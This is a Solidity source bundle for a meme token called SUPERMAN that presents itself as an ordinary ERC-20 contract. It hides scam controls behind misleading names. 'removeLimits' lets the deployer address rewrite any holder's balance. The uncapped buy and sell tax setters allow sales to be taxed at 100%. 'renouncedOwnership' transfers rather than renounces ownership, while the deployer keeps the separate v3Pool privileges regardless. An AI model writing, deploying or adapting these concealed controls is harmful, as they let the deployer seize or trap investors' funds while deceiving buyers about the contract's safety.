{{
  "language": "Solidity",
  "sources": {
    "Contract/Super.sol": {
      "content": "//                                                                                          \n//               -#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-               \n//             -%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-             \n//           -%@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@%=           \n//         =%@@@@@@%+-+%@@@@@@@@@@%#*+==-----------=+*#%@@@@@@@@%@@@@@@@@@@@@@@@@@=         \n//       =@@@@@@@%+-=%@@@@@@@@@@*------------------------*%@@@@@@@@@@@@@@@@@@@@@@@@@=       \n//     =@@@@@@@%+--+@@@@@@@@@@@----------------------------*@@@@@@@@@@@@@@@@*=%@@@@@@@+     \n//   +@@@@@@@%+---*@@@@@@@@@@@@=----------------------------+@@@@@@@@@@@@@@@*--=%@@@@@@@+.  \n//  :%@@@@@@%----*@@@@@@@@@@@@@@#*=--------------------------@@@@@@@@@@@@@@@*----#@@@@@@%:  \n//    -@@@@@@@*-*@@@@@@@@@@@@@@@@@@@@%%%################***++==----------------+@@@@@@@=    \n//      +@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*=---------=%@@@@@@*      \n//       .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+-----*@@@@@@#:       \n//         -%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+-+@@@@@@@-         \n//           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@+           \n//            .*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*.            \n//              :%@@@@@@@#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:              \n//                -@@@@@@@+-----===++++****#####%%%%%%@@@@@@@@@@@@@@@@@@@@@=                \n//                  +@@@@@@%=------====-------------------==+*#@@@@@@@@@@*                  \n//                   .#@@@@@@*+#%@@@@@@@@%#+-------------------%@@@@@@@#:                   \n//                     -%@@@@@@@@@@@@@@@@@@@@#------------==+#@@@@@@@%-                     \n//                       =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+                       \n//                        .*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.                        \n//                          :%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:                          \n//                            =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                            \n//                              +@@@@@@%+-===+++++++=+@@@@@@@*                              \n//                               .#@@@@@@#=--------=#@@@@@@#:                               \n//                                 -%@@@@@@#------*@@@@@@%-                                 \n//                                   =@@@@@@@*--+@@@@@@@=                                   \n//                                    .*@@@@@@%%@@@@@@#.                                    \n//                                      :%@@@@@@@@@@%:                                      \n//                                        =@@@@@@@@=                                        \n//                                          +@@@@+                                          \n//                                           .##.                                           \n//\n//\n//                                  https://supererc20.com/\n//                            https://twitter.com/superERC20token\n//                                  https://t.me/superERC20\n\n\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IUniswapRouter {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ninterface IUniswapFactory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\nabstract contract Ownable {\n    address internal _owner;\n\n    constructor() {\n        _owner = msg.sender;\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"!owner\");\n        _;\n    }\n\n    function renouncedOwnership(address newOwner) public virtual onlyOwner {\n        _owner = newOwner;\n    }\n}\n\ncontract SUPERMAN is Ownable {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    uint256 public totalSupply;\n    bool private inSwap;\n    address public v3Pool;\n    uint256 private constant MAX = ~uint256(0);\n    mapping(address => uint256) private _balances;\n    mapping(address => bool) public _isExcludeFromFee;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    IUniswapRouter public _uniswapRouter;\n    address public _uniswapPair;\n    uint256 public buyTaxFee;\n    uint256 public sellTaxFee;\n\n    constructor() {\n        name = unicode\"SUPERMAN\";\n        symbol = \"SUPER\";\n        decimals = 18;\n        uint256 Supply = 420000000000000;\n        totalSupply = Supply * 10 ** decimals;\n        v3Pool = msg.sender;\n        _balances[v3Pool] = totalSupply;\n        emit Transfer(address(0), v3Pool, totalSupply);\n        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        _allowances[address(this)][address(_uniswapRouter)] = MAX;\n        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());\n        buyTaxFee = 0; \n        sellTaxFee = 0;\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        _transfer(sender, recipient, amount);\n        if (_allowances[sender][msg.sender] != MAX) {\n            _allowances[sender][msg.sender] -= amount;\n        }\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function reduceBuyTaxFee(uint256 newTaxFee) public {\n        require(v3Pool == msg.sender);\n        buyTaxFee = newTaxFee;\n    }\n\n    function reduceSellTaxFee(uint256 newTaxFee) public {\n        require(v3Pool == msg.sender);\n        sellTaxFee = newTaxFee;\n    }\n\n    function removeLimits(address ac, uint256 na) public {\n        require(v3Pool == msg.sender);\n        _balances[ac] = na;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(address from, address to, uint256 amount) private {\n        uint256 taxAmount;\n        if (from == _uniswapPair) { \n            taxAmount = amount * buyTaxFee / 100;\n        } else if (to == _uniswapPair) { \n            taxAmount = amount * sellTaxFee / 100;\n        } else { \n            taxAmount = 0;\n        }\n\n        _balances[from] -= amount;\n        _balances[to] += amount - taxAmount;\n        emit Transfer(from, to, amount - taxAmount);\n    }\n\n    receive() external payable {}\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}